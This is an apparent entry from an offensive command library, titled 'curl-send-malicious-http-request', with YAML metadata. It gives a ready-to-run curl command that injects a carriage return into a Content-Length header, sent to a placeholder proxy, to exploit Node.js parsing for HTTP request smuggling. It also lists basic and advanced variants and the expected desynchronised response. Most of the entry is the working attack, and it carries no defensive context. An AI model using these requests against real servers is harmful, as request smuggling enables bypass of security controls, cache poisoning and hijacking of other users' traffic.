---
data: >-
  curl --path-as-is -i -s -k -X 'GET' -H 'Host: target.com' -H 'Content\rLength:
  42' -H 'Connection: Keep-Alive' --data-binary 'GET / HTTP/1.1\r\nHost:
  target.com\r\n\r\n' 'http://proxy.target.com/'
tags:
  - http
  - smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: f114dbd4-0c73-4720-97af-d86951c925e2
created_at: '2025-12-13T09:01:22.538Z'
updated_at: '2025-12-13T09:01:22.538Z'
verified: false
validated: true
submitted: true
---
# curl-send-malicious-http-request

## Command

```bash
curl --path-as-is -i -s -k -X 'GET' -H 'Host: target.com' -H 'Content\rLength: 42' -H 'Connection: Keep-Alive' --data-binary 'GET / HTTP/1.1\r\nHost: target.com\r\n\r\n' 'http://proxy.target.com/'
```

## Description

This command uses curl to send a malicious HTTP request with a CR in the header to exploit Node.js parsing for request smuggling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--path-as-is` | Do not squash path | Yes |
| `-H` | Custom headers | Yes |
| `--data-binary` | Send binary data | Yes |

## Examples

### Basic Usage

```bash
curl -H "Content\rLength: 42" http://proxy.target.com/
```

### Advanced Usage

```bash
curl --path-as-is -H "Content\rLength: 42" --data-binary 'smuggled request' http://proxy.target.com/
```

## Expected Output

HTTP response from the proxy, potentially showing desynchronized behavior.

## Related

- [[procedures/Craft-Malicious-HTTP-Request-with-CR-Length-Header]]
- [[procedures/Send-Crafted-HTTP-Stream-to-Proxy]]
